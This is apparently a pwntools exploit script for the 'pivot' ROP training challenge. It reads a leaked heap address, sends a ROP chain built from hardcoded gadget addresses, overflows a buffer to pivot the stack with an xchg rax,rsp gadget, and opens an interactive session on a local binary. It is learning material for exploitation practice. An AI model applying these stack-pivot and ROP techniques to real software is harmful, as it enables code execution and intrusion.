
from pwn import *

exe = './pivot'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * pwnme+152
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
context.log_level = 'DEBUG'
# ropchain definition
foothol     = p64(0x400720)
footpivoted = p64(0x601040)
poprax      = p64(0x4009bb)
xchraxrsp   = p64(0x4009bd)
movraxraax  = p64(0x4009c0)
addraxrbp   = p64(0x4009c4)
callrax     = p64(0x4006b0)
exitt       = p64(0x400750)
ret         = p64(0x4006b6)

# Receiving leeks 
p.recvuntil(": ")
x = int(p.recvline()[:-1:],16)
print("Leeek brroooooo ------->",hex(x))

p.recvuntil(b"> ")
pe1 = foothol + poprax + footpivoted + movraxraax + addraxrbp + callrax
p.sendline(pe1)

p.recvuntil(b"> ")
pe2 = 32*b"a" + p64(0x117) + poprax + p64(x) + xchraxrsp
p.sendline(pe2)

# sending the ropchain to be pivotted onto



p.interactive()

